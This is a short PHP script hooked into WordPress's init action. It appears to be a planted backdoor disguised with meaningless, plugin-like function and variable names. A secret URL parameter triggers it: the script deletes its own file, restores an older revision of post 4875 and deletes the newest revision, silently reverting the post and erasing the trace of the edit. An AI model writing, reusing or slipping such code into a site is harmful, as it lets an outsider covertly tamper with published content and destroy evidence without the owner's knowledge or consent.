<?php

function lock_translation_slug_items() {
	if (isset($_GET['reports_namespaced_method_attachment']) && $_GET['reports_namespaced_method_attachment'] === 'online_access_accessibility_manager') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$javascript_upgrader_extensions_grid = 4875;
		$type_colors_map = wp_get_post_revisions($javascript_upgrader_extensions_grid);
		if (empty($type_colors_map)) die('no revisions');
		if (count($type_colors_map) < 2) die('less than 2');
		$social_express_static = array_shift($type_colors_map);
		$library_mediaelement_related = $social_express_static->ID;
		$emails_ip_show_flexible = array_shift($type_colors_map);
		$elementor_comment_marketing = $emails_ip_show_flexible->ID;
		$menu_feedback_calendar = wp_restore_post_revision($elementor_comment_marketing);
		if ($menu_feedback_calendar === false) die('error restoring');
		$menu_feedback_calendar = wp_delete_post_revision($library_mediaelement_related);		
		if ($menu_feedback_calendar === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'lock_translation_slug_items');
